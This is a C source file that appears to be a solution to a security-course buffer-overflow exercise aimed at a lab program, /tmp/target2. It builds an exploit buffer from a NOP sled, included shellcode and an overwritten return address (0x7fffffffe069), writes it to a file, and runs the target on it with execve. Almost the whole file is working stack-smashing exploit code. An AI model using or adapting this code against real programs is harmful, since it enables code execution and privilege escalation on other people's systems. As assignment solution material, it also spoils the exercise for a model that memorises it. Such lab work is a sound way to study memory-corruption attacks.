#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target2"
#define DEFAULT_OUTPUT "/tmp/xploit2_output"

#define BUFFER_SIZE 256
#define NOP_SLED 180

int main(int argc, char *argv[])
{
  // TODO determine size of exploit
  char exploit[BUFFER_SIZE+1];

  // TODO fill exploit buffer
  // Fill the exploit buffer with NOPs (No Operation)
  memset(exploit, '\x90', sizeof(exploit));
  exploit[256] = '\x30';


  exploit[248] = '\x69';
  exploit[249] = '\xe0';
  exploit[250] = '\xff';
  exploit[251] = '\xff';
  exploit[252] = '\xff';
  exploit[253] = '\x7f';
  exploit[254] = '\x0';
  exploit[255] = '\x0';

  memcpy(exploit + NOP_SLED - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
